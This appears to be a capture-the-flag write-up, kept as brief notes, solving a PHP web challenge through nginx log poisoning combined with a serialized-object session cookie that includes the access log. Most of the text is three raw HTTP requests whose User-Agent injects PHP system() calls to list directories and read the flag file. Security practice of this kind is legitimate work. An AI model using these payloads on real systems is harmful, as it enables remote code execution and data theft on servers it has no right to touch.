
Read about config to find the log directory `/var/log/nginx/access.log`

![[Pasted image 20221022000226.png]]

So we think about log poisoning

```burp
GET / HTTP/1.1
Host: 161.35.36.157:31939
User-Agent: <?php system('ls'); ?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoyNToiL3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZyI7fQ%3d%3d
Upgrade-Insecure-Requests: 1

```


![[Pasted image 20221022000327.png]]

Find our flag

```burp
GET / HTTP/1.1
Host: 161.35.36.157:31939
User-Agent: <?php system('ls /'); ?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoyNToiL3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZyI7fQ%3d%3d
Upgrade-Insecure-Requests: 1

```

And get it

```burp
GET / HTTP/1.1
Host: 161.35.36.157:31939
User-Agent: <?php system('cat /flag_GlVC8'); ?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoyNToiL3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZyI7fQ%3d%3d
Upgrade-Insecure-Requests: 1
```